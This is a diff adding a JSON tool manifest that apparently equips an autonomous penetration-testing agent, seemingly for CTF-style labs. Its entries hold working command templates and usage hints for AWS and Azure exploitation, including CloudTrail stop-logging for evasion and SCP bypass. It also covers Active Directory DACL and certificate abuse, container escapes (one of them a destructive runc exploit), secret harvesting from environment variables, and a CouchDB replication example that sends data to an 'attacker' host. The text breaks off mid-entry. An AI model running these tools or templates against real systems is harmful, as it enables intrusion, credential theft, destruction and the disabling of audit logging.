@@ -1,0 +1,4879 @@
+{
+  "schema_version": "1.0.0",
+  "generated_at": "2026-08-17T10:51:45+00:00",
+  "source": "darwin.tools.manifest",
+  "tool_count": 130,
+  "tools": [
+    {
+      "name": "aws_cli",
+      "version": "1.0.0",
+      "description": "Execute AWS CLI commands for cloud service exploitation. Supports S3 (s3 ls/cp/sync --no-sign-request), IAM (iam list-roles/get-policy/attach-role-policy/simulate-principal-policy), STS (sts assume-role/get-caller-identity/assume-role-with-web-identity/assume-role-with-saml), KMS (kms decrypt/list-keys), Lambda (lambda list-functions/invoke/create-function), SQS (sqs list-queues/receive-message), DynamoDB (dynamodb list-tables/scan/query), Organizations (organizations describe-organization/list-accounts/list-policies/list-targets-for-policy/describe-policy/detach-policy/disable-policy-type), CloudFormation (cloudformation create-stack/validate-template/describe-stacks), CloudTrail (cloudtrail describe-trails/get-trail-status/get-event-selectors/stop-logging). For LOCAL cloud simulators (not real AWS), add '--endpoint-url http://localhost:PORT' or '--endpoint-url http://127.0.0.1:PORT' in payload_json to target the local service. Automatically uses IMDS credentials when running on EC2. For unauthenticated S3 access, add '--no-sign-request' to payload_json.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "service": {
+          "type": "string",
+          "description": "AWS service: s3, iam, sts, kms, lambda, sqs, dynamodb, organizations, cloudformation, cloudtrail. Use 'organizations' for SCP bypass and account enumeration. Use 'cloudformation' for template injection attacks. Use 'cloudtrail' for logging evasion and trail enumeration."
+        },
+        "action": {
+          "type": "string",
+          "description": "AWS CLI action: ls, cp, sync, list-roles, get-policy, get-role, attach-role-policy, simulate-principal-policy, assume-role, assume-role-with-web-identity, assume-role-with-saml, get-caller-identity, decrypt, list-functions, invoke, create-function, list-queues, receive-message, list-tables, scan, query, describe-organization, list-accounts, list-policies, list-targets-for-policy, describe-policy, detach-policy, disable-policy-type, create-stack, validate-template, describe-stacks, describe-trails, get-trail-status, get-event-selectors, stop-logging"
+        },
+        "resource": {
+          "type": "string",
+          "description": "Resource identifier (e.g., 's3://bucket-name', 'role/role-name', '--function-name NAME', '--queue-url URL', '--table-name NAME'). Leave empty for list operations."
+        },
+        "payload_json": {
+          "type": "string",
+          "description": "Additional flags, --query filters, or JSON payload. Examples: '--no-sign-request' (anonymous S3), '--endpoint-url http://localhost:10704' (local cloud simulator), '--role-session-name test', '--max-number-of-messages 10', '--filter-expression \"attribute_exists(flag)\"', '--query \"Buckets[].Name\"'",
+          "default": ""
+        }
+      },
+      "required": [
+        "service",
+        "action",
+        "resource"
+      ],
+      "executor": "shell",
+      "command_template": "aws {service} {action} {resource} {payload_json} --output json 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "aws_iam_federation",
+      "version": "1.0.0",
+      "description": "Execute AWS IAM cross-account attacks and federation abuse. Supports: cross-account AssumeRole chaining (use when you have credentials from IMDS and want to access another account), OIDC federation (AssumeRoleWithWebIdentity with JWT token — use for CLOUD-11 and OIDC-based attacks), SAML federation (AssumeRoleWithSAML for Golden SAML CLOUD-13), AWS Organizations enumeration (list accounts/policies), SCP bypass evaluation (simulate-principal-policy), and cross-account S3 access with temporary credentials.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "action": {
+          "type": "string",
+          "description": "Federation action: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3"
+        },
+        "role_arn": {
+          "type": "string",
+          "description": "Role ARN to assume (e.g. arn:aws:iam::ACCOUNT:role/ROLENAME). Also used as Policy ID for scp-evaluate."
+        },
+        "source_profile": {
+          "type": "string",
+          "description": "AWS profile name for source credentials (default: uses env vars from IMDS)"
+        },
+        "web_identity_token": {
+          "type": "string",
+          "description": "JWT/OIDC token for AssumeRoleWithWebIdentity (extracted from OIDC provider URL or forged)"
+        },
+        "saml_assertion": {
+          "type": "string",
+          "description": "SAML assertion XML for AssumeRoleWithSAML (base64-encoded or raw XML)"
+        },
+        "provider_arn": {
+          "type": "string",
+          "description": "SAML/OIDC Identity Provider ARN"
+        },
+        "role_session_name": {
+          "type": "string",
+          "description": "Session name for the assumed role session (default: darwin-session)"
+        },
+        "endpoint_url": {
+          "type": "string",
+          "description": "Custom endpoint URL for local cloud simulators (e.g. http://localhost:PORT)"
+        },
+        "duration_seconds": {
+          "type": "integer",
+          "description": "Session duration in seconds (default: 3600)"
+        }
+      },
+      "required": [
+        "action",
+        "role_arn",
+        "source_profile",
+        "web_identity_token",
+        "saml_assertion",
+        "provider_arn",
+        "role_session_name",
+        "endpoint_url",
+        "duration_seconds"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "aws_sts_query",
+      "version": "1.0.0",
+      "description": "Send AWS STS Query API request directly via HTTP POST to an STS-compatible endpoint (local simulator or real AWS). No AWS CLI required. Use for AssumeRole, GetCallerIdentity, GetSessionToken against cloud IAM simulators. Set api_version='2010-05-08' to bypass SCP enforcement via legacy API version. Automatically parses XML credentials from the response. IMPORTANT: RoleArn MUST be the full ARN format (arn:aws:iam::ACCOUNT:role/ROLENAME) — short role names will fail with 'Role not found'.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "endpoint_url": {
+          "type": "string",
+          "description": "STS API endpoint URL, e.g. http://127.0.0.1:10702 or http://localhost:PORT"
+        },
+        "action": {
+          "type": "string",
+          "description": "STS action: AssumeRole, GetCallerIdentity, GetSessionToken"
+        },
+        "access_key_id": {
+          "type": "string",
+          "description": "AWS Access Key ID (from IMDS metadata or known credentials)"
+        },
+        "secret_access_key": {
+          "type": "string",
+          "description": "AWS Secret Access Key (from IMDS metadata or known credentials)"
+        },
+        "role_arn": {
+          "type": "string",
+          "description": "FULL Role ARN (REQUIRED format: arn:aws:iam::ACCOUNT:role/ROLENAME). Short role names will fail. Get the full ARN from GET /roles endpoint."
+        },
+        "role_session_name": {
+          "type": "string",
+          "description": "Session name for assumed role session (default: darwin)"
+        },
+        "api_version": {
+          "type": "string",
+          "description": "AWS API version. Use '2010-05-08' to bypass SCP enforcement via legacy API (default: 2011-06-15)"
+        },
+        "duration_seconds": {
+          "type": "integer",
+          "description": "Session duration in seconds (default: 3600)"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "endpoint_url",
+        "action",
+        "access_key_id",
+        "secret_access_key",
+        "role_arn",
+        "role_session_name",
+        "api_version",
+        "duration_seconds",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "az_cli",
+      "version": "1.0.0",
+      "description": "Execute Azure CLI commands. Supports: vm (list/show), storage (account/blob/container list/show), ad (user/service-principal list), role (assignment list), keyvault (secret list/show), acr (repository list/show), functionapp (list/show). Use with Azure IMDS Managed Identity from check_cloud_metadata. Authenticate via 'az login --identity' for Managed Identity.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "service": {
+          "type": "string",
+          "description": "Azure service: vm, storage, ad, role, keyvault, acr, functionapp"
+        },
+        "action": {
+          "type": "string",
+          "description": "Action: list, show, download, create, get-policy, set-policy"
+        },
+        "resource": {
+          "type": "string",
+          "description": "Resource identifier (e.g. resource group name, storage account name, key vault name)"
+        },
+        "flags": {
+          "type": "string",
+          "description": "Additional flags: --resource-group, --account-name, --vault-name, --subscription (default: '')",
+          "default": ""
+        }
+      },
+      "required": [
+        "service",
+        "action",
+        "resource"
+      ],
+      "executor": "shell",
+      "command_template": "az {service} {action} {resource} {flags} --output json 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "bloodyad_dacl",
+      "version": "1.0.0",
+      "description": "AD DACL abuse via bloodyAD (AD-19, AD-20). Supports: set owner (WriteOwner), add GenericAll (ForceChangePassword), shadow credentials add, and other DACL modifications. Use when you have an account with write privileges over a target object but no direct control.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "user": {
+          "type": "string",
+          "description": "Attacker username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Attacker password"
+        },
+        "target": {
+          "type": "string",
+          "description": "Domain Controller hostname or IP"
+        },
+        "action": {
+          "type": "string",
+          "description": "Action: set owner, add GenericAll, add groupMember, set password, shadowCredentials"
+        },
+        "target_object": {
+          "type": "string",
+          "description": "Target DN or sAMAccountName to modify"
+        },
+        "extra": {
+          "type": "string",
+          "description": "Extra arguments (e.g. new owner DN for set owner)",
+          "default": ""
+        }
+      },
+      "required": [
+        "domain",
+        "user",
+        "password",
+        "target",
+        "action",
+        "target_object"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /opt/bloodyAD/bloodyAD.py -d {domain} -u {user} -p '{password}' --host {target} {action} {target_object} {extra} 2>&1  | head -80",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "certipy_adcs",
+      "version": "1.0.0",
+      "description": "Enumerate ADCS for vulnerable certificate templates (ESC1-ESC8). Use when domain enumeration discovers a CA server. ESC1: overly permissive enrollment agent. ESC2: template allows request without signature. ESC3: enrollment agent template without authorization. ESC4: vulnerable ACL on template. ESC6: CA Flag EDITF_ATTRIBUTESUBJECTALTNAME2. ESC8: NTLM relay to HTTP endpoint.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "user": {
+          "type": "string",
+          "description": "Domain username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Domain password"
+        },
+        "dc_ip": {
+          "type": "string",
+          "description": "Domain controller IP"
+        },
+        "ca_server": {
+          "type": "string",
+          "description": "CA server hostname/IP (discovered via certipy find or ldapsearch)"
+        }
+      },
+      "required": [
+        "user",
+        "password",
+        "dc_ip",
+        "ca_server"
+      ],
+      "executor": "shell",
+      "command_template": "certipy find -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -vulnerable 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "certipy_req",
+      "version": "1.0.0",
+      "description": "Request certificate from ADCS using vulnerable template (ESC1-3 exploitation). Outputs .pfx for PKINIT authentication.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "user": {
+          "type": "string",
+          "description": "Domain username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Domain password"
+        },
+        "dc_ip": {
+          "type": "string",
+          "description": "Domain controller IP"
+        },
+        "ca_server": {
+          "type": "string",
+          "description": "CA server hostname/IP"
+        },
+        "ca_name": {
+          "type": "string",
+          "description": "CA name from certipy find"
+        },
+        "template": {
+          "type": "string",
+          "description": "Vulnerable template name"
+        },
+        "alt_upn": {
+          "type": "string",
+          "description": "Alternative UPN for impersonation (e.g. Administrator@domain.local)"
+        },
+        "alt_dns": {
+          "type": "string",
+          "description": "Alternative DNS hostname"
+        }
+      },
+      "required": [
+        "user",
+        "password",
+        "dc_ip",
+        "ca_server",
+        "ca_name",
+        "template",
+        "alt_upn",
+        "alt_dns"
+      ],
+      "executor": "shell",
+      "command_template": "certipy req -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -ca {ca_name} -template {template} -upn {alt_upn} -dns {alt_dns} 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "check_capabilities",
+      "version": "1.0.0",
+      "description": "Check container capabilities AND generate exploitation commands for dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW, CAP_SYS_MODULE).",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "check_cloud_metadata",
+      "version": "1.0.0",
+      "description": "Check cloud metadata endpoints for AWS, GCP, Azure, Alicloud, and DigitalOcean. Extracts instance info, IAM credentials, and service account tokens. Use when inside a container or VM on cloud infrastructure — cloud credentials can enable lateral movement to cloud services.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "check_mounts",
+      "version": "1.0.0",
+      "description": "Check mounted filesystems AND generate exploitation commands for dangerous mounts (docker.sock, hostPath, CRI socket, /proc access, /sys access).",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "command_injection_test",
+      "version": "1.0.0",
+      "description": "Test for command injection using multiple probe techniques",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL"
+        },
+        "param": {
+          "type": "string",
+          "description": "Parameter to test"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "param",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_cap_dac",
+      "version": "1.0.0",
+      "description": "Read host files using CAP_DAC_READ_SEARCH capability. Tries multiple methods: /proc/1/root, nsenter, and direct read with DAC bypass. Use when check_capabilities shows CAP_DAC_READ_SEARCH. Start with target_file='/etc/shadow' or target_file='/flag.txt'.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_file": {
+          "type": "string",
+          "description": "Absolute path to file to read from host (default /etc/shadow). Also try: /flag*, /root/.ssh/id_rsa, /home/*/.ssh/"
+        },
+        "ref_file": {
+          "type": "string",
+          "description": "Known bind-mounted file to use as reference (default /etc/hostname)"
+        }
+      },
+      "required": [
+        "target_file",
+        "ref_file"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_cgroup",
+      "version": "1.0.0",
+      "description": "ESCAPE privileged container via cgroup release_agent (cgroup v1). Requires SYS_ADMIN capability. Mounts cgroup fs, sets release_agent to execute a script on the HOST. Use ONLY when check_capabilities shows SYS_ADMIN. Start with shell_cmd='cat /flag*' or 'find / -name flag* 2>/dev/null'.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "shell_cmd": {
+          "type": "string",
+          "description": "Shell command to execute on the HOST (e.g. 'id', 'cat /etc/shadow', 'find / -name flag*')"
+        },
+        "subsystem": {
+          "type": "string",
+          "description": "Cgroup subsystem to use: memory (default, most common), rdma, or misc. Try memory first."
+        }
+      },
+      "required": [
+        "shell_cmd",
+        "subsystem"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_docker_api",
+      "version": "1.0.0",
+      "description": "ESCAPE container via Docker TCP API (port 2375, no auth). Creates privileged container with host root mounted. Use ONLY after container_find_docker confirms TCP Docker API is reachable. Start with shell_cmd='cat /host/flag*' to find flags. Differs from docker_sock escape — this works over TCP network, not UNIX socket.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Docker API host IP or hostname (e.g. 'localhost', '10.0.0.1')"
+        },
+        "port": {
+          "type": "integer",
+          "description": "Docker API TCP port (default 2375, also try 2376 for TLS)"
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Command to execute on the HOST"
+        },
+        "image": {
+          "type": "string",
+          "description": "Container image (default alpine:latest)"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "shell_cmd",
+        "image"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_docker_sock",
+      "version": "1.0.0",
+      "description": "ESCAPE container via exposed docker.sock. Creates a privileged container with host root (/) mounted at /host, then runs your command on the HOST. Use ONLY after container_find_sockets confirms docker.sock exists. Start with shell_cmd='cat /host/flag*' to find flags on the host.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "sock_path": {
+          "type": "string",
+          "description": "Path to docker.sock (default /var/run/docker.sock)"
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Command to execute on the HOST via privileged container (e.g. 'cat /host/flag*', 'cat /host/etc/shadow')"
+        },
+        "image": {
+          "type": "string",
+          "description": "Container image to use (default alpine:latest)"
+        },
+        "timeout_cmd": {
+          "type": "integer",
+          "description": "Max seconds for shell_cmd execution (default 60)"
+        }
+      },
+      "required": [
+        "sock_path",
+        "shell_cmd",
+        "image",
+        "timeout_cmd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_mount_disk",
+      "version": "1.0.0",
+      "description": "ESCAPE container by mounting a host disk partition. Auto-detects Linux host devices (/dev/sda1, /dev/vda1, /dev/xvda1) or accepts a specific device path. Mounts the device and reads files from the host filesystem. Use when you can see host block devices in /dev.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "device_path": {
+          "type": "string",
+          "description": "Path to host block device (e.g. '/dev/sda1'). Leave empty for auto-detection."
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Shell command to execute on mounted host fs"
+        }
+      },
+      "required": [
+        "device_path",
+        "shell_cmd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_procfs",
+      "version": "1.0.0",
+      "description": "ESCAPE container via host /proc mount. If the host's /proc is visible, /proc/<pid>/root/ points to the HOST root filesystem. Use when check_mounts shows /proc from host. Access host files via /proc/1/root/path/to/file. Try pid=1 first, then try other pids (bash, sh, sshd).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "pid": {
+          "type": "integer",
+          "description": "Process ID on the HOST (default 1). Try 1, then check ps aux for other host PIDs."
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Shell command to run, prefixing host paths with /proc/{pid}/root/"
+        }
+      },
+      "required": [
+        "pid",
+        "shell_cmd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_escape_runc",
+      "version": "1.0.0",
+      "description": "Attempt CVE-2019-5736 runc container breakout. Exploits runc < 1.0.0-rc6 by overwriting /proc/self/exe. DESTRUCTIVE — overwrites runc binary on host. Use ONLY as last resort when docker.sock, cgroup, cap_dac, and mount_disk all fail. The payload_cmd is executed on the HOST the next time someone runs 'docker exec' in this container.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "payload_cmd": {
+          "type": "string",
+          "description": "Command to execute on host when runc is triggered (default sends flag to /tmp/runc_flag_out.txt)"
+        }
+      },
+      "required": [
+        "payload_cmd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_find_docker",
+      "version": "1.0.0",
+      "description": "Locate Docker daemon via UNIX socket and TCP ports. Checks: (1) common docker.sock paths, (2) TCP ports 2375/2376, (3) DOCKER_HOST env var. Use after container_find_sockets to confirm Docker availability before escape.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "echo '[1] Checking docker.sock...' && ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; echo '[2] Scanning Docker TCP ports (2375,2376)...' && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | grep -E '2375|2376'; echo '[3] Checking DOCKER_HOST env...' && env 2>/dev/null | grep -i docker; echo '---DONE---'",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_find_sockets",
+      "version": "1.0.0",
+      "description": "Search for UNIX domain sockets on the filesystem. Use when inside a container to find docker.sock, containerd.sock, or other exploitable sockets. Common paths: /var/run, /run, /tmp. Differs from check_mounts — this finds sockets, not mount points.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "path": {
+          "type": "string",
+          "description": "Root path to start scanning from (default '/')"
+        }
+      },
+      "required": [
+        "path"
+      ],
+      "executor": "shell",
+      "command_template": "find {path} -type s 2>/dev/null | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "container_recon_env",
+      "version": "1.0.0",
+      "description": "Scan container environment variables and /proc/*/environ for secrets (passwords, tokens, API keys, credentials). Use when inside a container to find credentials for lateral movement or cloud access. This is the container equivalent of linux_priv_check — discovers what's available before exploitation.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "echo '[ENV Secrets]' && env 2>/dev/null | grep -iE 'password|secret|token|key|cred|api|auth' | grep -v '^_='; echo '[ProcFS /proc/1/environ]' && (cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key|cred|api|auth' || echo 'not-accessible'); echo '[ProcFS scan]' && for p in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do found=$(cat /proc/$p/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key' | head -2); if [ -n \"$found\" ]; then echo \"PID $p: $found\"; fi; done; echo '---DONE---'",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "couchdb_query",
+      "version": "1.0.0",
+      "description": "Interact with CouchDB REST API. Supports database enumeration ('/_all_dbs'), document access ('/db/doc_id'), user management ('/_users/org.couchdb.user:admin'), and replication trigger with privilege escalation ('/_replicate' — create admin user then replicate to gain access). Default port 5984. Many CouchDB instances allow unauthenticated access. Use the /_replicate endpoint with target pointing to a user DB for privilege escalation to create an admin account.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "CouchDB host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "CouchDB port (default 5984)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: GET, POST, PUT"
+        },
+        "path": {
+          "type": "string",
+          "description": "API path (e.g. '/_all_dbs', '/_users/org.couchdb.user:admin', '/flagdb/_all_docs?include_docs=true', '/_replicate')"
+        },
+        "body_json": {
+          "type": "string",
+          "description": "JSON body for POST/PUT requests. Example for replication attack: '-d \\'{\"source\":\"flagdb\",\"target\":\"http://attacker:5984/leaked\"}\\''. For user creation: '-d \\'{\"name\":\"admin\",\"password\":\"hacked\",\"roles\":[\"_admin\"],\"type\":\"user\"}\\''"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "method",
+        "path",
+        "body_json"
+      ],
+      "executor": "shell",
+      "command_template": "curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "crictl_cmd",
+      "version": "1.0.0",
+      "description": "Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks - when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "endpoint": {
+          "type": "string",
+          "description": "CRI socket path (e.g. 'unix:///run/containerd/containerd.sock')",
+          "default": "unix:///run/containerd/containerd.sock"
+        },
+        "action": {
+          "type": "string",
+          "description": "CRI action: pods, ps, inspect, exec, images, pull"
+        },
+        "args": {
+          "type": "string",
+          "description": "Arguments for the action (container ID for inspect/exec, image name for pull, '-a' for ps)",
+          "default": ""
+        }
+      },
+      "required": [
+        "action"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "crictl",
+        "--runtime-endpoint",
+        "{endpoint}",
+        "{action}",
+        "{args}"
+      ],
+      "split_params": [
+        "action",
+        "args"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "curl_get",
+      "version": "1.0.0",
+      "description": "Make HTTP GET request. Use insecure=true for self-signed TLS. Supports file:// URLs and client certs (cert/key).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL (also file:// for local files)"
+        },
+        "headers": {
+          "type": "string",
+          "description": "Optional comma-separated headers"
+        },
+        "cookie": {
+          "type": "string",
+          "description": "Session cookie string from try_login"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification (set true for self-signed certs)"
+        },
+        "follow_redirects": {
+          "type": "boolean",
+          "description": "Follow HTTP redirects"
+        },
+        "cert": {
+          "type": "string",
+          "description": "Path to TLS client certificate file (for mutual TLS)"
+        },
+        "key": {
+          "type": "string",
+          "description": "Path to TLS client key file (for mutual TLS)"
+        }
+      },
+      "required": [
+        "url",
+        "headers",
+        "cookie",
+        "insecure",
+        "follow_redirects",
+        "cert",
+        "key"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "cve_lookup",
+      "version": "1.0.0",
+      "description": "Look up CVE details from NIST NVD: CVSS score, severity, description, affected versions, and references. Use to assess vulnerability severity and find patches.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "cve_id": {
+          "type": "string",
+          "description": "CVE ID (e.g. CVE-2021-44228, CVE-2023-12345)"
+        }
+      },
+      "required": [
+        "cve_id"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ddg_web_search",
+      "version": "1.0.0",
+      "description": "Search the internet via DuckDuckGo for current exploitation techniques, default credentials, version-specific PoCs, and recent CVEs. Use together with knowledge_search. Parameters: query (search terms), max_results (1-15, default 8).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "query": {
+          "type": "string",
+          "description": "Search query (e.g. 'MSSQL sa default password exploitation')"
+        },
+        "max_results": {
+          "type": "integer",
+          "description": "Max results (1-15, default 8)"
+        }
+      },
+      "required": [
+        "query",
+        "max_results"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "dirb_scan",
+      "version": "1.0.0",
+      "description": "Enumerate directories and files on a web server using dirb",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL to scan"
+        }
+      },
+      "required": [
+        "target_url"
+      ],
+      "executor": "shell",
+      "command_template": "dirb {target_url} /usr/share/dirb/wordlists/common.txt -S -w",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "docker_registry",
+      "version": "1.0.0",
+      "description": "Pull, tag, and push a Docker image to a target registry. Use for container registry poisoning attacks (K8S-09 supply chain).",
